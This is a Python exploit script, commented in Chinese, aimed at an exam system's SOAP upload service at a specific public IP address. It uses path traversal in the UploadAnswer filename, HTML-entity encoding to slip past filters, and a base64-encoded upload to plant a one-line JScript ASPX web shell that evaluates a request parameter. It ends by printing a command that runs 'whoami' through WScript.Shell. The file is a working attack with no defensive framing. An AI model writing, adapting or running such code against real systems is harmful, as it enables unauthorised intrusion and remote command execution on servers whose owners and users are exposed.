import requests
import base64
import os

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
# 目标文件名
SHELL_FILENAME = "shell_v3.aspx"
# 利用相对路径遍历回溯目录
# 假设我们修改了 AnswerPath 为 WebRoot
# 路径结构: WebRoot\Answer\{Code2 Name}\A01\{filename}
# 我们需要回溯 3 层: ..\..\..\{SHELL_FILENAME}
TRAVERSAL_FILENAME = f"..\\..\\..\\{SHELL_FILENAME}"

SHELL_CODE = r'<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>'

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def upload_shell():
    print(f"=== 开始上传 Web Shell (遍历版) ===")

    # HTML 实体编码 filename，防止 XML 解析错误，同时可能绕过部分 WAF
    encoded_filename = to_html_entities(TRAVERSAL_FILENAME)
    file_b64 = base64.b64encode(SHELL_CODE.encode('utf-8')).decode('utf-8')

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <UploadAnswer xmlns="http://tempuri.org/">
          <uid>9207</uid>
          <aid>1</aid> <filename>{encoded_filename}</filename>
          <file>{file_b64}</file>
        </UploadAnswer>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/UploadAnswer"

        print(f"[*] Filename Payload: {TRAVERSAL_FILENAME}")
        print(f"[*] 发送 UploadAnswer 请求...")

        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=10)

        if response.status_code == 200:
            if "OK" in response.text or "UploadAnswerResult" in response.text:
                print(f"    [+] 上传成功! HTTP 200")
            else:
                print(f"    [?] HTTP 200 但响应内容异常: {response.text[:200]}")

            shell_url = f"http://120.55.241.236:999/{SHELL_FILENAME}"
            print(f"\n[★] Shell 地址: {shell_url}")
            print(f"    测试命令 (JScript): {shell_url}?c=var d=new ActiveXObject(\"WScript.Shell\");var o=d.Exec(\"cmd /c whoami\");Response.Write(o.StdOut.ReadAll());")
        elif response.status_code == 500:
            print(f"    [!] HTTP 500 - 可能是路径错误或权限问题")
            print(f"    详情: {response.text[:300]}")
        else:
            print(f"    [-] 失败, 状态码: {response.status_code}")

    except Exception as e:
        print(f"    [!] 异常: {e}")

if __name__ == "__main__":
    upload_shell()
